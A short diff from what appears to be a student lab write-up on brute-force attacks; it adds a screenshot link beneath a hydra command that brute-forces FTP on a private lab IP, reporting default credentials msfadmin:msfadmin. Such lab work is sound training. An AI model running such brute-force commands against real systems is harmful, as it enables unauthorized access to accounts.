@@ -72,7 +72,7 @@ Initial usernames used for brute force attacks were manually prepared in a file 
     - Command Used:
         
           hydra -L usernames.txt -P passwords.txt ftp://192.168.154.133
-
+![Screenshot](https://github.com/L-Azymm/Labwork-1/blob/Image/Screenshot%202025-04-08%20122731.png?raw=true)
 Result: Successful login found – msfadmin:msfadmin
 
 ---
